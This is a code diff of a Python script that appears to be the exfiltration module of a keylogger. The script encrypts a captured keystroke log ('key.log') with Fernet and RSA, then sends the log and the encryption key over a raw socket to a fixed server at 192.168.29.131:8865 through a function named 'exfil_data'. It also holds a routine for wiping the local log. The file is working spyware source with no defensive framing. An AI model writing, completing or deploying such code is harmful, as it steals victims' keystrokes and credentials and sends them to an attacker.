@@ -3,18 +3,14 @@ import os
 from cryptography.fernet import Fernet
 import rsa
 
-SERVER = '192.168.29.131'
-PORT = 8865
 log_file = 'key.log'
-
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((SERVER, PORT))
 
 
 def prep_key():
     key = open('fernet.key', 'rb').read()
-    asym_key = rsa.PublicKey.load_pkcs1(open('public.key', 'rb').read())
-    return rsa.encrypt(key, asym_key)
+    asym_key = rsa.PublicKey.load_pkcs1(open('public.pem', 'rb').read())
+    open('fernet.enc', 'wb').write(rsa.encrypt(key, asym_key))
+    return 0
 
 
 def symm_encrypt(text):
@@ -29,30 +25,36 @@ def encrypt_logs():
 
 
 def del_logs():
-    open(log_file, 'wb').write('')
+    open(log_file, 'wb').write(b'')
 
 
 def send_data(file, recv_fname, data=None):
+    SERVER = '192.168.29.131'
+    PORT = 8865
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((SERVER, PORT))
+
     '''
     if file == 0: then we are sending reading data from a file but a variable in data
     '''
-    if file != 0:
-        file_size = os.path.getsize(file)
-        data = open(file, 'rb').read()
-
+    data = open(file, 'rb').read()
+    recv_fname = recv_fname+' '*(1024-len(recv_fname))
+    print(f'[!]\tSending file: {recv_fname}')
     client.send(recv_fname.encode())
-    client.send(str(file_size).encode())
 
     client.sendall(data)
-    client.send(b'<END OF FILE>')
+    client.send('<END OF FILE>'.encode())
+    print('okok')
+    client.close()
 
 
 def exfil_data():
+    # prep_key()
     encrypt_logs()
-    send_data(log_file, 'recv_key.log')
-    send_data(0, 'fernet.key', prep_key())
-    client.close()
-    del_logs()
+    send_data(log_file, 'key.log')
+    send_data('fernet.key', 'fernet.key')
+    # del_logs()
 
 
 exfil_data()
